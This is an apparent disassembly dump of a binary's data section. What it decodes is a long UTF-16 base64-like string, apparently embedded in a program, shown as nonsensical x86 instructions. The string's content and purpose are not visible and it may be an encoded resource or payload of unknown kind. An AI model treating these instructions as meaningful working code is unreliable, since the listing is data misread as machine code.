  40b99c:	00 63 00             	add    %ah,0x0(%ebx)
  40b99f:	51                   	push   %ecx
  40b9a0:	00 68 00             	add    %ch,0x0(%eax)
  40b9a3:	39 00                	cmp    %eax,(%eax)
  40b9a5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9a6:	00 45 00             	add    %al,0x0(%ebp)
  40b9a9:	37                   	aaa
  40b9aa:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40b9ae:	00 43 00             	add    %al,0x0(%ebx)
  40b9b1:	4f                   	dec    %edi
  40b9b2:	00 30                	add    %dh,(%eax)
  40b9b4:	00 42 00             	add    %al,0x0(%edx)
  40b9b7:	54                   	push   %esp
  40b9b8:	00 30                	add    %dh,(%eax)
  40b9ba:	00 6e 00             	add    %ch,0x0(%esi)
  40b9bd:	37                   	aaa
  40b9be:	00 4b 00             	add    %cl,0x0(%ebx)
  40b9c1:	2b 00                	sub    (%eax),%eax
  40b9c3:	38 00                	cmp    %al,(%eax)
  40b9c5:	56                   	push   %esi
  40b9c6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b9c9:	55                   	push   %ebp
  40b9ca:	00 69 00             	add    %ch,0x0(%ecx)
  40b9cd:	41                   	inc    %ecx
  40b9ce:	00 58 00             	add    %bl,0x0(%eax)
  40b9d1:	75 00                	jne    0x40b9d3
  40b9d3:	78 00                	js     0x40b9d5
  40b9d5:	52                   	push   %edx
  40b9d6:	00 47 00             	add    %al,0x0(%edi)
  40b9d9:	33 00                	xor    (%eax),%eax
  40b9db:	51                   	push   %ecx
  40b9dc:	00 52 00             	add    %dl,0x0(%edx)
  40b9df:	42                   	inc    %edx
  40b9e0:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40b9e4:	00 68 00             	add    %ch,0x0(%eax)
  40b9e7:	4e                   	dec    %esi
  40b9e8:	00 50 00             	add    %dl,0x0(%eax)
  40b9eb:	38 00                	cmp    %al,(%eax)
  40b9ed:	53                   	push   %ebx
  40b9ee:	00 58 00             	add    %bl,0x0(%eax)
  40b9f1:	79 00                	jns    0x40b9f3
  40b9f3:	47                   	inc    %edi
  40b9f4:	00 73 00             	add    %dh,0x0(%ebx)
  40b9f7:	72 00                	jb     0x40b9f9
  40b9f9:	47                   	inc    %edi
  40b9fa:	00 4b 00             	add    %cl,0x0(%ebx)
  40b9fd:	62 00                	bound  %eax,(%eax)
  40b9ff:	49                   	dec    %ecx
  40ba00:	00 37                	add    %dh,(%edi)
  40ba02:	00 68 00             	add    %ch,0x0(%eax)
  40ba05:	4d                   	dec    %ebp
  40ba06:	00 39                	add    %bh,(%ecx)
  40ba08:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40ba0c:	00 37                	add    %dh,(%edi)
  40ba0e:	00 32                	add    %dh,(%edx)
  40ba10:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40ba14:	00 6e 00             	add    %ch,0x0(%esi)
  40ba17:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba18:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba1b:	50                   	push   %eax
  40ba1c:	00 4e 00             	add    %cl,0x0(%esi)
  40ba1f:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40ba23:	5a                   	pop    %edx
  40ba24:	00 65 00             	add    %ah,0x0(%ebp)
  40ba27:	30 00                	xor    %al,(%eax)
  40ba29:	70 00                	jo     0x40ba2b
  40ba2b:	54                   	push   %esp
  40ba2c:	00 58 00             	add    %bl,0x0(%eax)
  40ba2f:	63 00                	arpl   %eax,(%eax)
  40ba31:	6b 00 48             	imul   $0x48,(%eax),%eax
  40ba34:	00 4a 00             	add    %cl,0x0(%edx)
  40ba37:	45                   	inc    %ebp
  40ba38:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba3b:	2b 00                	sub    (%eax),%eax
  40ba3d:	71 00                	jno    0x40ba3f
  40ba3f:	54                   	push   %esp
  40ba40:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40ba44:	00 6f 00             	add    %ch,0x0(%edi)
  40ba47:	56                   	push   %esi
  40ba48:	00 63 00             	add    %ah,0x0(%ebx)
  40ba4b:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40ba4f:	63 00                	arpl   %eax,(%eax)
  40ba51:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40ba55:	43                   	inc    %ebx
  40ba56:	00 4e 00             	add    %cl,0x0(%esi)
  40ba59:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40ba5d:	50                   	push   %eax
  40ba5e:	00 4f 00             	add    %cl,0x0(%edi)
  40ba61:	67 00 31             	add    %dh,(%bx,%di)
  40ba64:	00 39                	add    %bh,(%ecx)
  40ba66:	00 71 00             	add    %dh,0x0(%ecx)
  40ba69:	78 00                	js     0x40ba6b
  40ba6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba6c:	00 55 00             	add    %dl,0x0(%ebp)
  40ba6f:	55                   	push   %ebp
  40ba70:	00 52 00             	add    %dl,0x0(%edx)
  40ba73:	76 00                	jbe    0x40ba75
  40ba75:	49                   	dec    %ecx
  40ba76:	00 2f                	add    %ch,(%edi)
  40ba78:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba7b:	4f                   	dec    %edi
  40ba7c:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba7f:	49                   	dec    %ecx
  40ba80:	00 6a 00             	add    %ch,0x0(%edx)
  40ba83:	38 00                	cmp    %al,(%eax)
  40ba85:	73 00                	jae    0x40ba87
  40ba87:	56                   	push   %esi
  40ba88:	00 73 00             	add    %dh,0x0(%ebx)
  40ba8b:	75 00                	jne    0x40ba8d
  40ba8d:	41                   	inc    %ecx
  40ba8e:	00 39                	add    %bh,(%ecx)
  40ba90:	00 30                	add    %dh,(%eax)
  40ba92:	00 58 00             	add    %bl,0x0(%eax)
  40ba95:	4a                   	dec    %edx
  40ba96:	00 6f 00             	add    %ch,0x0(%edi)
  40ba99:	37                   	aaa
  40ba9a:	00 50 00             	add    %dl,0x0(%eax)
  40ba9d:	50                   	push   %eax
  40ba9e:	00 4a 00             	add    %cl,0x0(%edx)
  40baa1:	78 00                	js     0x40baa3
  40baa3:	38 00                	cmp    %al,(%eax)
  40baa5:	2f                   	das
  40baa6:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40baaa:	00 75 00             	add    %dh,0x0(%ebp)
  40baad:	7a 00                	jp     0x40baaf
  40baaf:	6b 00 45             	imul   $0x45,(%eax),%eax
  40bab2:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40bab6:	00 73 00             	add    %dh,0x0(%ebx)
  40bab9:	5a                   	pop    %edx
  40baba:	00 4e 00             	add    %cl,0x0(%esi)
  40babd:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40bac1:	32 00                	xor    (%eax),%al
  40bac3:	51                   	push   %ecx
  40bac4:	00 4a 00             	add    %cl,0x0(%edx)
  40bac7:	6a 00                	push   $0x0
  40bac9:	41                   	inc    %ecx
  40baca:	00 6e 00             	add    %ch,0x0(%esi)
  40bacd:	38 00                	cmp    %al,(%eax)
  40bacf:	51                   	push   %ecx
  40bad0:	00 38                	add    %bh,(%eax)
  40bad2:	00 57 00             	add    %dl,0x0(%edi)
  40bad5:	37                   	aaa
  40bad6:	00 76 00             	add    %dh,0x0(%esi)
  40bad9:	62 00                	bound  %eax,(%eax)
  40badb:	6a 00                	push   $0x0
  40badd:	39 00                	cmp    %eax,(%eax)
  40badf:	4e                   	dec    %esi
  40bae0:	00 61 00             	add    %ah,0x0(%ecx)
  40bae3:	30 00                	xor    %al,(%eax)
  40bae5:	46                   	inc    %esi
  40bae6:	00 63 00             	add    %ah,0x0(%ebx)
  40bae9:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40baed:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40baf1:	73 00                	jae    0x40baf3
  40baf3:	61                   	popa
  40baf4:	00 30                	add    %dh,(%eax)
  40baf6:	00 6a 00             	add    %ch,0x0(%edx)
  40baf9:	2b 00                	sub    (%eax),%eax
  40bafb:	6f                   	outsl  %ds:(%esi),(%dx)
  40bafc:	00 33                	add    %dh,(%ebx)
  40bafe:	00 4e 00             	add    %cl,0x0(%esi)
  40bb01:	39 00                	cmp    %eax,(%eax)
  40bb03:	72 00                	jb     0x40bb05
  40bb05:	41                   	inc    %ecx
  40bb06:	00 73 00             	add    %dh,0x0(%ebx)
  40bb09:	52                   	push   %edx
  40bb0a:	00 6f 00             	add    %ch,0x0(%edi)
  40bb0d:	41                   	inc    %ecx
  40bb0e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40bb12:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb15:	71 00                	jno    0x40bb17
  40bb17:	37                   	aaa
  40bb18:	00 68 00             	add    %ch,0x0(%eax)
  40bb1b:	47                   	inc    %edi
  40bb1c:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40bb20:	00 45 00             	add    %al,0x0(%ebp)
  40bb23:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40bb27:	4d                   	dec    %ebp
  40bb28:	00 61 00             	add    %ah,0x0(%ecx)
  40bb2b:	34 00                	xor    $0x0,%al
  40bb2d:	4a                   	dec    %edx
  40bb2e:	00 39                	add    %bh,(%ecx)
  40bb30:	00 38                	add    %bh,(%eax)
  40bb32:	00 59 00             	add    %bl,0x0(%ecx)
  40bb35:	74 00                	je     0x40bb37
  40bb37:	56                   	push   %esi
  40bb38:	00 31                	add    %dh,(%ecx)
  40bb3a:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40bb3e:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40bb42:	00 59 00             	add    %bl,0x0(%ecx)
  40bb45:	33 00                	xor    (%eax),%eax
  40bb47:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40bb4b:	79 00                	jns    0x40bb4d
  40bb4d:	4b                   	dec    %ebx
  40bb4e:	00 57 00             	add    %dl,0x0(%edi)
  40bb51:	32 00                	xor    (%eax),%al
  40bb53:	54                   	push   %esp
  40bb54:	00 61 00             	add    %ah,0x0(%ecx)
  40bb57:	5a                   	pop    %edx
  40bb58:	00 31                	add    %dh,(%ecx)
  40bb5a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb5d:	30 00                	xor    %al,(%eax)
  40bb5f:	6c                   	insb   (%dx),%es:(%edi)
  40bb60:	00 56 00             	add    %dl,0x0(%esi)
  40bb63:	75 00                	jne    0x40bb65
  40bb65:	45                   	inc    %ebp
  40bb66:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb69:	5a                   	pop    %edx
  40bb6a:	00 72 00             	add    %dh,0x0(%edx)
  40bb6d:	45                   	inc    %ebp
  40bb6e:	00 41 00             	add    %al,0x0(%ecx)
  40bb71:	67 00 32             	add    %dh,(%bp,%si)
  40bb74:	00 53 00             	add    %dl,0x0(%ebx)
  40bb77:	76 00                	jbe    0x40bb79
  40bb79:	69 00 4e 00 34 00    	imul   $0x34004e,(%eax),%eax
  40bb7f:	6d                   	insl   (%dx),%es:(%edi)
  40bb80:	00 76 00             	add    %dh,0x0(%esi)
  40bb83:	53                   	push   %ebx
  40bb84:	00 32                	add    %dh,(%edx)
  40bb86:	00 39                	add    %bh,(%ecx)
  40bb88:	00 41 00             	add    %al,0x0(%ecx)
  40bb8b:	52                   	push   %edx
  40bb8c:	00 43 00             	add    %al,0x0(%ebx)
  40bb8f:	45                   	inc    %ebp
  40bb90:	00 62 00             	add    %ah,0x0(%edx)
  40bb93:	75 00                	jne    0x40bb95
  40bb95:	7a 00                	jp     0x40bb97
  40bb97:	6b 00 31             	imul   $0x31,(%eax),%eax
  40bb9a:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40bb9e:	00 4b 00             	add    %cl,0x0(%ebx)
  40bba1:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40bba5:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40bba9:	52                   	push   %edx
  40bbaa:	00 31                	add    %dh,(%ecx)
  40bbac:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40bbb0:	00 62 00             	add    %ah,0x0(%edx)
  40bbb3:	62 00                	bound  %eax,(%eax)
  40bbb5:	78 00                	js     0x40bbb7
  40bbb7:	54                   	push   %esp
  40bbb8:	00 38                	add    %bh,(%eax)
  40bbba:	00 63 00             	add    %ah,0x0(%ebx)
  40bbbd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbbe:	00 48 00             	add    %cl,0x0(%eax)
  40bbc1:	4e                   	dec    %esi
  40bbc2:	00 61 00             	add    %ah,0x0(%ecx)
  40bbc5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbc6:	00 63 00             	add    %ah,0x0(%ebx)
  40bbc9:	35 00 39 00 53       	xor    $0x53003900,%eax
  40bbce:	00 72 00             	add    %dh,0x0(%edx)
  40bbd1:	5a                   	pop    %edx
  40bbd2:	00 38                	add    %bh,(%eax)
  40bbd4:	00 62 00             	add    %ah,0x0(%edx)
  40bbd7:	49                   	dec    %ecx
  40bbd8:	00 68 00             	add    %ch,0x0(%eax)
  40bbdb:	43                   	inc    %ebx
  40bbdc:	00 59 00             	add    %bl,0x0(%ecx)
  40bbdf:	5a                   	pop    %edx
  40bbe0:	00 73 00             	add    %dh,0x0(%ebx)
  40bbe3:	35 00 6e 00 31       	xor    $0x31006e00,%eax
  40bbe8:	00 6e 00             	add    %ch,0x0(%esi)
  40bbeb:	6d                   	insl   (%dx),%es:(%edi)
  40bbec:	00 49 00             	add    %cl,0x0(%ecx)
  40bbef:	68 00 2b 00 69       	push   $0x69002b00
  40bbf4:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbf7:	63 00                	arpl   %eax,(%eax)
  40bbf9:	54                   	push   %esp
  40bbfa:	00 79 00             	add    %bh,0x0(%ecx)
  40bbfd:	61                   	popa
  40bbfe:	00 65 00             	add    %ah,0x0(%ebp)
  40bc01:	36 00 38             	add    %bh,%ss:(%eax)
  40bc04:	00 77 00             	add    %dh,0x0(%edi)
  40bc07:	48                   	dec    %eax
  40bc08:	00 75 00             	add    %dh,0x0(%ebp)
  40bc0b:	77 00                	ja     0x40bc0d
  40bc0d:	4d                   	dec    %ebp
  40bc0e:	00 68 00             	add    %ch,0x0(%eax)
  40bc11:	49                   	dec    %ecx
  40bc12:	00 50 00             	add    %dl,0x0(%eax)
  40bc15:	31 00                	xor    %eax,(%eax)
  40bc17:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40bc1b:	30 00                	xor    %al,(%eax)
  40bc1d:	54                   	push   %esp
  40bc1e:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40bc22:	00 31                	add    %dh,(%ecx)
  40bc24:	00 76 00             	add    %dh,0x0(%esi)
  40bc27:	4a                   	dec    %edx
  40bc28:	00 48 00             	add    %cl,0x0(%eax)
  40bc2b:	56                   	push   %esi
  40bc2c:	00 4d 00             	add    %cl,0x0(%ebp)
  40bc2f:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40bc33:	77 00                	ja     0x40bc35
  40bc35:	30 00                	xor    %al,(%eax)
  40bc37:	51                   	push   %ecx
  40bc38:	00 30                	add    %dh,(%eax)
  40bc3a:	00 63 00             	add    %ah,0x0(%ebx)
  40bc3d:	37                   	aaa
  40bc3e:	00 45 00             	add    %al,0x0(%ebp)
  40bc41:	6c                   	insb   (%dx),%es:(%edi)
  40bc42:	00 57 00             	add    %dl,0x0(%edi)
  40bc45:	33 00                	xor    (%eax),%eax
  40bc47:	61                   	popa
  40bc48:	00 47 00             	add    %al,0x0(%edi)
  40bc4b:	37                   	aaa
  40bc4c:	00 61 00             	add    %ah,0x0(%ecx)
  40bc4f:	75 00                	jne    0x40bc51
  40bc51:	7a 00                	jp     0x40bc53
  40bc53:	59                   	pop    %ecx
  40bc54:	00 67 00             	add    %ah,0x0(%edi)
  40bc57:	75 00                	jne    0x40bc59
  40bc59:	79 00                	jns    0x40bc5b
  40bc5b:	35 00 74 00 35       	xor    $0x35007400,%eax
  40bc60:	00 78 00             	add    %bh,0x0(%eax)
  40bc63:	5a                   	pop    %edx
  40bc64:	00 6f 00             	add    %ch,0x0(%edi)
  40bc67:	77 00                	ja     0x40bc69
  40bc69:	31 00                	xor    %eax,(%eax)
  40bc6b:	67 00 64 00          	add    %ah,0x0(%si)
  40bc6f:	6c                   	insb   (%dx),%es:(%edi)
  40bc70:	00 46 00             	add    %al,0x0(%esi)
  40bc73:	67 00 67 00          	add    %ah,0x0(%bx)
  40bc77:	6a 00                	push   $0x0
  40bc79:	43                   	inc    %ebx
  40bc7a:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40bc7e:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40bc82:	00 4e 00             	add    %cl,0x0(%esi)
  40bc85:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40bc89:	58                   	pop    %eax
  40bc8a:	00 4a 00             	add    %cl,0x0(%edx)
  40bc8d:	55                   	push   %ebp
  40bc8e:	00 78 00             	add    %bh,0x0(%eax)
  40bc91:	41                   	inc    %ecx
  40bc92:	00 45 00             	add    %al,0x0(%ebp)
  40bc95:	46                   	inc    %esi
  40bc96:	00 4e 00             	add    %cl,0x0(%esi)
  40bc99:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40bc9d:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40bca1:	58                   	pop    %eax
  40bca2:	00 48 00             	add    %cl,0x0(%eax)
  40bca5:	6d                   	insl   (%dx),%es:(%edi)
  40bca6:	00 59 00             	add    %bl,0x0(%ecx)
  40bca9:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40bcad:	5a                   	pop    %edx
  40bcae:	00 71 00             	add    %dh,0x0(%ecx)
  40bcb1:	6c                   	insb   (%dx),%es:(%edi)
  40bcb2:	00 33                	add    %dh,(%ebx)
  40bcb4:	00 66 00             	add    %ah,0x0(%esi)
  40bcb7:	7a 00                	jp     0x40bcb9
  40bcb9:	61                   	popa
  40bcba:	00 43 00             	add    %al,0x0(%ebx)
  40bcbd:	68 00 33 00 4d       	push   $0x4d003300
  40bcc2:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40bcc6:	00 45 00             	add    %al,0x0(%ebp)
  40bcc9:	34 00                	xor    $0x0,%al
  40bccb:	63 00                	arpl   %eax,(%eax)
  40bccd:	44                   	inc    %esp
  40bcce:	00 47 00             	add    %al,0x0(%edi)
  40bcd1:	71 00                	jno    0x40bcd3
  40bcd3:	55                   	push   %ebp
  40bcd4:	00 32                	add    %dh,(%edx)
  40bcd6:	00 36                	add    %dh,(%esi)
  40bcd8:	00 5a 00             	add    %bl,0x0(%edx)
  40bcdb:	4f                   	dec    %edi
  40bcdc:	00 43 00             	add    %al,0x0(%ebx)
  40bcdf:	41                   	inc    %ecx
  40bce0:	00 57 00             	add    %dl,0x0(%edi)
  40bce3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bce4:	00 77 00             	add    %dh,0x0(%edi)
  40bce7:	48                   	dec    %eax
  40bce8:	00 61 00             	add    %ah,0x0(%ecx)
  40bceb:	48                   	dec    %eax
  40bcec:	00 53 00             	add    %dl,0x0(%ebx)
  40bcef:	78 00                	js     0x40bcf1
  40bcf1:	68 00 7a 00 48       	push   $0x48007a00
  40bcf6:	00 58 00             	add    %bl,0x0(%eax)
  40bcf9:	6b 00 69             	imul   $0x69,(%eax),%eax
  40bcfc:	00 55 00             	add    %dl,0x0(%ebp)
  40bcff:	59                   	pop    %ecx
  40bd00:	00 2f                	add    %ch,(%edi)
  40bd02:	00 75 00             	add    %dh,0x0(%ebp)
  40bd05:	63 00                	arpl   %eax,(%eax)
  40bd07:	4c                   	dec    %esp
  40bd08:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40bd0c:	00 30                	add    %dh,(%eax)
  40bd0e:	00 37                	add    %dh,(%edi)
  40bd10:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40bd14:	00 4f 00             	add    %cl,0x0(%edi)
  40bd17:	33 00                	xor    (%eax),%eax
  40bd19:	66 00 47 00          	data16 add %al,0x0(%edi)
  40bd1d:	58                   	pop    %eax
  40bd1e:	00 68 00             	add    %ch,0x0(%eax)
  40bd21:	74 00                	je     0x40bd23
  40bd23:	32 00                	xor    (%eax),%al
  40bd25:	4a                   	dec    %edx
  40bd26:	00 58 00             	add    %bl,0x0(%eax)
  40bd29:	61                   	popa
  40bd2a:	00 4a 00             	add    %cl,0x0(%edx)
  40bd2d:	30 00                	xor    %al,(%eax)
  40bd2f:	34 00                	xor    $0x0,%al
  40bd31:	54                   	push   %esp
  40bd32:	00 55 00             	add    %dl,0x0(%ebp)
  40bd35:	47                   	inc    %edi
  40bd36:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd39:	2f                   	das
  40bd3a:	00 68 00             	add    %ch,0x0(%eax)
  40bd3d:	57                   	push   %edi
  40bd3e:	00 33                	add    %dh,(%ebx)
  40bd40:	00 5a 00             	add    %bl,0x0(%edx)
  40bd43:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40bd47:	41                   	inc    %ecx
  40bd48:	00 76 00             	add    %dh,0x0(%esi)
  40bd4b:	66 00 44 00 68       	data16 add %al,0x68(%eax,%eax,1)
  40bd50:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40bd54:	00 46 00             	add    %al,0x0(%esi)
  40bd57:	56                   	push   %esi
  40bd58:	00 33                	add    %dh,(%ebx)
  40bd5a:	00 53 00             	add    %dl,0x0(%ebx)
  40bd5d:	77 00                	ja     0x40bd5f
  40bd5f:	76 00                	jbe    0x40bd61
  40bd61:	55                   	push   %ebp
  40bd62:	00 31                	add    %dh,(%ecx)
  40bd64:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd67:	47                   	inc    %edi
  40bd68:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40bd6c:	00 4f 00             	add    %cl,0x0(%edi)
  40bd6f:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40bd72:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40bd76:	00 6f 00             	add    %ch,0x0(%edi)
  40bd79:	76 00                	jbe    0x40bd7b
  40bd7b:	70 00                	jo     0x40bd7d
  40bd7d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd7e:	00 4e 00             	add    %cl,0x0(%esi)
  40bd81:	74 00                	je     0x40bd83
  40bd83:	6a 00                	push   $0x0
  40bd85:	74 00                	je     0x40bd87
  40bd87:	70 00                	jo     0x40bd89
  40bd89:	35 00 2f 00 47       	xor    $0x47002f00,%eax
  40bd8e:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40bd92:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40bd96:	00 76 00             	add    %dh,0x0(%esi)
  40bd99:	39 00                	cmp    %eax,(%eax)
  40bd9b:	69 00 30 00 49 00    	imul   $0x490030,(%eax),%eax
  40bda1:	52                   	push   %edx
  40bda2:	00 56 00             	add    %dl,0x0(%esi)
  40bda5:	31 00                	xor    %eax,(%eax)
  40bda7:	77 00                	ja     0x40bda9
  40bda9:	4d                   	dec    %ebp
  40bdaa:	00 51 00             	add    %dl,0x0(%ecx)
  40bdad:	46                   	inc    %esi
  40bdae:	00 6d 00             	add    %ch,0x0(%ebp)
  40bdb1:	51                   	push   %ecx
  40bdb2:	00 42 00             	add    %al,0x0(%edx)
  40bdb5:	2b 00                	sub    (%eax),%eax
  40bdb7:	42                   	inc    %edx
  40bdb8:	00 35 00 63 00 77    	add    %dh,0x77006300
  40bdbe:	00 61 00             	add    %ah,0x0(%ecx)
  40bdc1:	75 00                	jne    0x40bdc3
  40bdc3:	77 00                	ja     0x40bdc5
  40bdc5:	38 00                	cmp    %al,(%eax)
  40bdc7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdc8:	00 53 00             	add    %dl,0x0(%ebx)
  40bdcb:	6c                   	insb   (%dx),%es:(%edi)
  40bdcc:	00 4d 00             	add    %cl,0x0(%ebp)
  40bdcf:	58                   	pop    %eax
  40bdd0:	00 59 00             	add    %bl,0x0(%ecx)
  40bdd3:	50                   	push   %eax
  40bdd4:	00 51 00             	add    %dl,0x0(%ecx)
  40bdd7:	53                   	push   %ebx
  40bdd8:	00 30                	add    %dh,(%eax)
  40bdda:	00 39                	add    %bh,(%ecx)
  40bddc:	00 50 00             	add    %dl,0x0(%eax)
  40bddf:	4f                   	dec    %edi
  40bde0:	00 6a 00             	add    %ch,0x0(%edx)
  40bde3:	38 00                	cmp    %al,(%eax)
  40bde5:	56                   	push   %esi
  40bde6:	00 59 00             	add    %bl,0x0(%ecx)
  40bde9:	35 00 68 00 57       	xor    $0x57006800,%eax
  40bdee:	00 6e 00             	add    %ch,0x0(%esi)
  40bdf1:	58                   	pop    %eax
  40bdf2:	00 63 00             	add    %ah,0x0(%ebx)
  40bdf5:	6a 00                	push   $0x0
  40bdf7:	32 00                	xor    (%eax),%al
  40bdf9:	6c                   	insb   (%dx),%es:(%edi)
  40bdfa:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40bdfe:	00 59 00             	add    %bl,0x0(%ecx)
  40be01:	33 00                	xor    (%eax),%eax
  40be03:	4f                   	dec    %edi
  40be04:	00 73 00             	add    %dh,0x0(%ebx)
  40be07:	46                   	inc    %esi
  40be08:	00 55 00             	add    %dl,0x0(%ebp)
  40be0b:	63 00                	arpl   %eax,(%eax)
  40be0d:	52                   	push   %edx
  40be0e:	00 71 00             	add    %dh,0x0(%ecx)
  40be11:	42                   	inc    %edx
  40be12:	00 67 00             	add    %ah,0x0(%edi)
  40be15:	76 00                	jbe    0x40be17
  40be17:	71 00                	jno    0x40be19
  40be19:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40be1d:	54                   	push   %esp
  40be1e:	00 48 00             	add    %cl,0x0(%eax)
  40be21:	70 00                	jo     0x40be23
  40be23:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40be27:	6d                   	insl   (%dx),%es:(%edi)
  40be28:	00 47 00             	add    %al,0x0(%edi)
  40be2b:	57                   	push   %edi
  40be2c:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40be30:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40be36:	80 b1 4d 00 55 00 62 	xorb   $0x62,0x55004d(%ecx)
  40be3d:	00 55 00             	add    %dl,0x0(%ebp)
  40be40:	6b 00 62             	imul   $0x62,(%eax),%eax
  40be43:	00 6d 00             	add    %ch,0x0(%ebp)
  40be46:	39 00                	cmp    %eax,(%eax)
  40be48:	73 00                	jae    0x40be4a
  40be4a:	69 00 31 00 54 00    	imul   $0x540031,(%eax),%eax
  40be50:	38 00                	cmp    %al,(%eax)
  40be52:	41                   	inc    %ecx
  40be53:	00 45 00             	add    %al,0x0(%ebp)
  40be56:	4f                   	dec    %edi
  40be57:	00 46 00             	add    %al,0x0(%esi)
  40be5a:	38 00                	cmp    %al,(%eax)
  40be5c:	75 00                	jne    0x40be5e
  40be5e:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40be62:	47                   	inc    %edi
  40be63:	00 77 00             	add    %dh,0x0(%edi)
  40be66:	37                   	aaa
  40be67:	00 6f 00             	add    %ch,0x0(%edi)
  40be6a:	74 00                	je     0x40be6c
  40be6c:	75 00                	jne    0x40be6e
  40be6e:	47                   	inc    %edi
  40be6f:	00 46 00             	add    %al,0x0(%esi)
  40be72:	51                   	push   %ecx
  40be73:	00 49 00             	add    %cl,0x0(%ecx)
  40be76:	59                   	pop    %ecx
  40be77:	00 67 00             	add    %ah,0x0(%edi)
  40be7a:	70 00                	jo     0x40be7c
  40be7c:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40be80:	2b 00                	sub    (%eax),%eax
  40be82:	30 00                	xor    %al,(%eax)
  40be84:	61                   	popa
  40be85:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40be89:	00 79 00             	add    %bh,0x0(%ecx)
  40be8c:	46                   	inc    %esi
  40be8d:	00 55 00             	add    %dl,0x0(%ebp)
  40be90:	47                   	inc    %edi
  40be91:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40be95:	00 78 00             	add    %bh,0x0(%eax)
  40be98:	41                   	inc    %ecx
  40be99:	00 6f 00             	add    %ch,0x0(%edi)
  40be9c:	65 00 2f             	add    %ch,%gs:(%edi)
  40be9f:	00 58 00             	add    %bl,0x0(%eax)
  40bea2:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40bea5:	00 50 00             	add    %dl,0x0(%eax)
  40bea8:	48                   	dec    %eax
  40bea9:	00 57 00             	add    %dl,0x0(%edi)
  40beac:	4c                   	dec    %esp
  40bead:	00 4b 00             	add    %cl,0x0(%ebx)
  40beb0:	49                   	dec    %ecx
  40beb1:	00 62 00             	add    %ah,0x0(%edx)
  40beb4:	53                   	push   %ebx
  40beb5:	00 45 00             	add    %al,0x0(%ebp)
  40beb8:	54                   	push   %esp
  40beb9:	00 63 00             	add    %ah,0x0(%ebx)
  40bebc:	50                   	push   %eax
  40bebd:	00 4b 00             	add    %cl,0x0(%ebx)
  40bec0:	34 00                	xor    $0x0,%al
  40bec2:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40bec6:	4d                   	dec    %ebp
  40bec7:	00 61 00             	add    %ah,0x0(%ecx)
  40beca:	58                   	pop    %eax
  40becb:	00 78 00             	add    %bh,0x0(%eax)
  40bece:	50                   	push   %eax
  40becf:	00 4b 00             	add    %cl,0x0(%ebx)
  40bed2:	67 00 74 00          	add    %dh,0x0(%si)
